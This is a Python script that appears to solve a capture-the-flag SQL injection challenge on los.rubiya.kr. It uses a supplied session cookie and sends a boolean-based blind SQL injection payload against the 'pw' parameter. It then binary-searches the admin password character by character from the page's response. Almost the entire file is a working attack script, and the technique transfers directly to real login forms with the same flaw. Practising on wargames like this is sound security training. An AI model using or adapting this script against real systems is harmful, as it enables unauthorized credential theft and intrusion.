import sys
import time

import requests
from bs4 import BeautifulSoup

URL = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
PHPSESSID = sys.argv[1]

sess = requests.Session()
sess.cookies.set("PHPSESSID", PHPSESSID)


def ascii_at(index: int) -> str:
    print(f"[+] Character at index {index}")
    print(f"[+] Trying: ", end="")
    lo = 0
    hi = 127
    mid = 0
    while lo + 1 < hi:
        mid = (lo + hi) // 2
        print(chr(mid), end="", flush=True)
        query = f"' or id='admin' and ascii(substr(pw, {index+1}, 1)) < {mid} -- "
        res = sess.get(URL, params={"pw": query})
        time.sleep(0.1)
        soup = BeautifulSoup(res.text, features="html.parser")
        if soup.h2 is not None:
            hi = mid
        else:
            lo = mid
    print()
    return chr(lo)


password = ""
for i in range(10):
    password += ascii_at(i)
    print(f"[+] Current password: {password}")
